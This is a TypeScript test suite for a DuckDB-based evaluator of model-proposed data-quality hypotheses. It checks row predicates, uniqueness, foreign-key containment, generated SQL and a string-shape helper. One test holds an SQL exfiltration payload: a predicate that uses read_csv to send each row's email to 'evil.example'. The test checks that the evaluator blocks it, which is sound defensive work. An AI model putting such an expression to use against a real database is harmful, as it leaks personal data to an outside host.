import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { createTestDb, type TestConn } from "./helpers/duckdb";
import {
  evaluateHypothesis, violationCountQuery, type Schema,
} from "@/lib/hypotheses/evaluate";
import type { Check, Hypothesis } from "@/lib/hypotheses/schema";
import { collapseShape } from "@/lib/profile/shapes";
import { loadSources, encode } from "./helpers/load";
import { CSV_FIXTURE } from "./fixtures";

/** Two related tables, so containment can be tested in both directions. */
const ORDERS = `order_id,customer_id,total
1,100,50.00
2,100,25.00
3,101,10.00
4,102,0.00
`;

// order 4 has no line; line 5 points at order 99, which does not exist.
const LINES = `line_id,order_id,qty
1,1,2
2,1,1
3,2,4
4,3,1
5,99,7
`;

let conn: TestConn;
let schema: Schema;
let rowCounts: Map<string, number>;

const hypothesis = (check: Check): Hypothesis => ({
  id: "h", title: "t", rationale: "r", severity: "medium", check,
});

const evaluate = (check: Check) =>
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  evaluateHypothesis(conn as any, hypothesis(check), schema, rowCounts);

beforeAll(async () => {
  const testDb = await createTestDb();
  const r = await loadSources(testDb.db, [
    { table: "data", label: "fixture.csv", format: "csv", bytes: encode(CSV_FIXTURE) },
    { table: "orders", label: "orders.csv", format: "csv", bytes: encode(ORDERS) },
    { table: "lines", label: "lines.csv", format: "csv", bytes: encode(LINES) },
  ]);
  schema = r.schema;
  rowCounts = r.rowCounts;
  conn = await testDb.connect();
}, 180_000);

afterAll(() => conn?.close());

describe("row predicates", () => {
  it("reports HOLDS when nothing violates", async () => {
    const r = await evaluate({ kind: "row_predicate", table: "data", expression: "id > 0" });
    expect(r.status).toBe("holds");
  });

  it("reports FALSIFIED with a count, a percentage and a duration", async () => {
    const r = await evaluate({ kind: "row_predicate", table: "data", expression: "amount >= 0" });
    expect(r.status).toBe("falsified");
    if (r.status !== "falsified") throw new Error("unreachable");
    expect(r.violations).toBe(1);
    expect(r.pct).toBeCloseTo(100 / 6, 1);
    expect(r.ms).toBeGreaterThanOrEqual(0);
    expect(r.sql).toContain("FROM data");
  });

  it("treats a NULL predicate as passing", async () => {
    const r = await evaluate({
      kind: "row_predicate", table: "data", expression: "length(ssn) = 11",
    });
    expect(r.status).toBe("holds");
  });

  it("skips rather than throws when the model invents a column", async () => {
    const r = await evaluate({
      kind: "row_predicate", table: "data", expression: "no_such_column > 0",
    });
    expect(r.status).toBe("skipped");
    if (r.status !== "skipped") throw new Error("unreachable");
    expect(r.reason).toMatch(/no_such_column/i);
  });

  it("refuses an exfiltration attempt before DuckDB ever sees it", async () => {
    const r = await evaluate({
      kind: "row_predicate", table: "data",
      expression: "read_csv('https://evil.example/?d=' || email) IS NOT NULL",
    });
    expect(r.status).toBe("skipped");
    if (r.status !== "skipped") throw new Error("unreachable");
    expect(r.reason).toMatch(/external data/i);
  });

  it("refuses a table the model invented", async () => {
    const r = await evaluate({
      kind: "row_predicate", table: "secrets", expression: "1 = 1",
    });
    expect(r.status).toBe("skipped");
    if (r.status !== "skipped") throw new Error("unreachable");
    expect(r.reason).toMatch(/unknown table/i);
  });
});

describe("uniqueness", () => {
  it("detects duplicate combinations and passes genuine keys", async () => {
    const dup = await evaluate({ kind: "unique", table: "data", columns: ["email", "ssn"] });
    expect(dup.status).toBe("falsified");
    if (dup.status !== "falsified") throw new Error("unreachable");
    expect(dup.violations).toBe(2);

    const key = await evaluate({ kind: "unique", table: "data", columns: ["id"] });
    expect(key.status).toBe("holds");
  });

  it("refuses unknown columns", async () => {
    const r = await evaluate({ kind: "unique", table: "data", columns: ["nope"] });
    expect(r.status).toBe("skipped");
  });
});

describe("cross-table containment", () => {
  it("finds rows pointing at a parent that does not exist", async () => {
    // lines.order_id = 99 has no matching orders.order_id.
    const r = await evaluate({
      kind: "references", table: "lines", columns: ["order_id"],
      referencesTable: "orders", referencesColumns: ["order_id"],
    });
    expect(r.status).toBe("falsified");
    if (r.status !== "falsified") throw new Error("unreachable");
    expect(r.violations).toBe(1);
    expect(r.rowCount).toBe(5);
    expect(r.sql).toContain("NOT EXISTS");
  });

  it("tests the other direction: a parent with no children", async () => {
    // orders 4 has no line item.
    const r = await evaluate({
      kind: "references", table: "orders", columns: ["order_id"],
      referencesTable: "lines", referencesColumns: ["order_id"],
    });
    expect(r.status).toBe("falsified");
    if (r.status !== "falsified") throw new Error("unreachable");
    expect(r.violations).toBe(1);
  });

  it("holds when every value is present", async () => {
    const r = await evaluate({
      kind: "references", table: "orders", columns: ["customer_id"],
      referencesTable: "orders", referencesColumns: ["customer_id"],
    });
    expect(r.status).toBe("holds");
  });

  it("refuses an unknown referenced table or mismatched column counts", async () => {
    const unknown = await evaluate({
      kind: "references", table: "lines", columns: ["order_id"],
      referencesTable: "ghost", referencesColumns: ["order_id"],
    });
    expect(unknown.status).toBe("skipped");

    const mismatch = await evaluate({
      kind: "references", table: "lines", columns: ["order_id"],
      referencesTable: "orders", referencesColumns: ["order_id", "total"],
    });
    expect(mismatch.status).toBe("skipped");
  });
});

describe("violationCountQuery", () => {
  it("always selects a single count from a table we named", () => {
    expect(
      violationCountQuery(
        { kind: "row_predicate", table: "data", expression: "amount >= 0" },
        schema,
      ),
    ).toBe(
      "SELECT count(*) AS violations FROM data WHERE NOT coalesce((amount >= 0), true)",
    );
  });
});

describe("collapseShape", () => {
  it("collapses runs of three or more and leaves short runs alone", () => {
    expect(collapseShape("aaaaaaa9999@aaaa.aaa")).toBe("a{7}9{4}@a{4}.a{3}");
    expect(collapseShape("aa9@a")).toBe("aa9@a");
    expect(collapseShape("")).toBe("");
  });
});
